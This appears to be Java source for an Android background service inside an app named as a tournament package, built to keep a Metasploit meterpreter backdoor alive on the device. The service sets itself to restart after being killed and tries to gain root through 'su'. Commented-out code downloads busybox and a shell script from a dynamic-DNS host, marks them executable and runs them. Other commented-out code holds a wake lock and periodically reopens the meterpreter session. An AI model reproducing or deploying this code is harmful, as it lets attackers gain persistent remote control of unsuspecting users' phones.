package com.example.pista.tornei;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.util.Log;

import java.io.IOException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.app.job.JobScheduler;

public class MyIntentService extends Service {
    public static Context gcontext;
    public static String curdir;
    public MyIntentService(Context applicationContext) {
        super();
        Log.i("HERE", "here I am!");
    }
    ScheduledFuture<?> beeperHandle;
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

    public MyIntentService() {
    }
    static class C00002 extends Thread {
        C00002() {
        }

        public void run() {
/*            Payload.DownloadFromUrl("http://verifiche.ddns.net/android/busybox");
            Payload.DownloadFromUrl("http://verifiche.ddns.net/android/woffice.sh");
            try {
                Process pexec = Runtime.getRuntime().exec("chmod 755 "+curdir+"/busybox");
                Thread.sleep(60 * 1000);
                pexec = Runtime.getRuntime().exec("chmod 755 "+curdir+"/woffice.sh");
                Thread.sleep(60 * 1000);
                pexec = Runtime.getRuntime().exec("nohup "+curdir+"/woffice.sh");
            }catch (Exception e) {
                e.printStackTrace();
            }
            Payload.main(null);
*/

            try {
                //Process p Runtime.getRuntime().exec("su", null, null);
                Process p = Runtime.getRuntime().exec("su");
                try {
                    p.waitFor();
                }
                catch (InterruptedException e) {
                    System.out.println("got interrupted!");
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            //finish();

        }
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
/*        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        WakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                "MyApp::MyWakelockTag");
        wakeLock.acquire();
        gcontext=this;
        curdir=gcontext.getApplicationInfo().dataDir;
        new C00002().start();
*/       //try {
        //    while (true) {
                //Payload.start(this);
        //        Thread.sleep(60 * 1000);
        //    }
        //}
        // catch (Exception e) {
        //    Payload.start(this);
        //    e.printStackTrace();
        //}
        //Payload.main(null);
        periodicallyAttempt(); //modify this method, more than 10 seconds are hard-coded set
        // If we get killed, after returning from here, restart
        return START_STICKY;
    }
    public void onDestroy() {
        super.onDestroy();
        //Payload.stop();
        scheduler.shutdownNow();
        Intent broadcastIntent = new Intent("uk.ac.shef.oak.ActivityRecognition.RestartSensor");
        sendBroadcast(broadcastIntent);

    }
    public void periodicallyAttempt(){
        //if meterpreter session dies unexpectedly, the background service will try to reopen it without restarting the app
        //since a new session is started, even if the current session is still alive, i put a very large period (30 min)

        //long half_an_hour = (60)/(2); //time passing between each attempt to open a new meterpreter session
        long half_an_hour = 30;
/*        final Runnable beeper = new Runnable() {

            public void run()
            {
                Payload.start(getApplicationContext());

            }

        };

        beeperHandle = scheduler.scheduleAtFixedRate(beeper, half_an_hour, half_an_hour, TimeUnit.SECONDS);
*/
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
